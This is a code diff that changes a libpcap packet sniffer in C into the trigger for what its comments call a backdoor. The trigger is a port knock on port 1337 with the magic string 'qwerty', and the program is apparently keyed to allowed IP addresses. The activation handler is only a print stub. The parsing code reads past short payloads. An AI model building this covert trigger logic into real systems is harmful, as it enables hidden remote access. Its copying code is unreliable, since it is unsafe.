@@ -198,6 +198,7 @@
 
 #include <pcap.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 #include <stdlib.h>
 #include <ctype.h>
@@ -219,8 +220,6 @@
 /* Ethernet addresses are 6 bytes */
 #define ETHER_ADDR_LEN	6
 
-// the target port knocking port
-#define TARGET_PORT 1337
 
 
 /* Ethernet header */
@@ -292,15 +291,73 @@ print_app_usage(void);
 
 
 
-// --------------------- M Y  F U N C T I O N S --------------------------
+// ---------------------  M Y   M O D I F I C A T I O N S  --------------------------
 
 
-// function to run when the port knock occurs
-void port_knock_success(){
-	printf("BANG\n");
+
+
+// the target port knocking port
+#define TARGET_PORTS 	(int[]) {1337}
+
+// number of knocks to activate the backdoor
+#define NUM_TARGETS 1
+
+// bytes in payload to check against
+#define TARGET_STR "qwerty"
+
+// if defined, we will print this number of bytes in the payload after the target string
+#define PAYLOAD_SIZE 8
+
+
+// the state of our current port knocking
+//	basically the next index to listen for in our port knocking sequence
+int pknock_state = 0;
+
+// function to update the port knocking state
+//	increments pknock_state when dst port matches next 
+//	returns 1 on port knock success, 0 otherwise
+int update_pknock_state(int dst_port, const char* payload, int size_payload){
+
+	// check for the target string in the payload
+	int target_bytes = sizeof(TARGET_STR);
+	char key[target_bytes];
+	memcpy(key, payload, target_bytes-1);
+	key[target_bytes-1]=0;
+
+	// check if we can move onto the next part of the knock sequence
+	if(TARGET_PORTS[pknock_state]==dst_port && strcmp((const char*) key, TARGET_STR)==0){
+		pknock_state++;
+
+		#ifdef DEBUG
+			printf("Knocked on port %d, #%d in the sequence\n", dst_port, pknock_state);
+		#endif
+
+		// check if this is end of the knock
+		if(pknock_state == NUM_TARGETS){
+			
+			#ifdef PAYLOAD_SIZE
+				// print out rest of the payload
+				int payload_bytes = PAYLOAD_SIZE;
+				if(size_payload - (target_bytes-1) < PAYLOAD_SIZE) payload_bytes = size_payload - target_bytes;
+				char msg[payload_bytes+1];
+				memcpy(msg, payload+target_bytes-1, payload_bytes);
+				msg[payload_bytes]=0;
+				printf("%s\n",(const char*) msg);
+			#endif
+
+			return 1;
+		}
+	}
+	return 0;
 }
 
 
+// function to run when the port knock occurs
+void pknock_success(){
+	printf("BANG\n");
+}
+
+// returns the current ip address
 char* get_ip_addr(){
 		
 	// get host name and IP address of current machine
@@ -348,7 +405,7 @@ int check_env_key(const char* ip_addr, FILE* config_file){
 
 
 
-// ----------------------------------------------------------------
+// ------------------------------------------------------------------------------------
 
 
 
@@ -569,14 +626,6 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 		printf("   Dst port: %d\n", ntohs(tcp->th_dport));
 	#endif
 
-#ifdef TARGET_PORT
-	if(ntohs(tcp->th_dport) == TARGET_PORT){
-		port_knock_success();
-		#ifdef DEBUG
-			printf("Port knock on %d success!\n", TARGET_PORT);
-		#endif
-	}
-#endif
 
 	/* define/compute tcp payload (segment) offset */
 	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
@@ -588,9 +637,17 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	 * Print payload data; it might be binary, so don't just
 	 * treat it as a string.
 	 */
-	if (size_payload > 0) {
+	#ifdef DEBUG
 		printf("   Payload (%d bytes):\n", size_payload);
 		print_payload(payload, size_payload);
+	#endif
+
+	
+	if(update_pknock_state(ntohs(tcp->th_dport),payload,size_payload) == 1){
+		pknock_success();
+		#ifdef DEBUG
+			printf("Port knock success!\n");
+		#endif
 	}
 
 return;
@@ -606,7 +663,7 @@ int main(int argc, char **argv)
 	struct bpf_program fp;			/* compiled filter program (expression) */
 	bpf_u_int32 mask;			/* subnet mask */
 	bpf_u_int32 net;			/* ip */
-	int num_packets = 10;			/* number of packets to capture */
+	int num_packets = 100;			/* number of packets to capture */
 
 	char* config_file_name; /* name of config file with valid IP addresses */
 
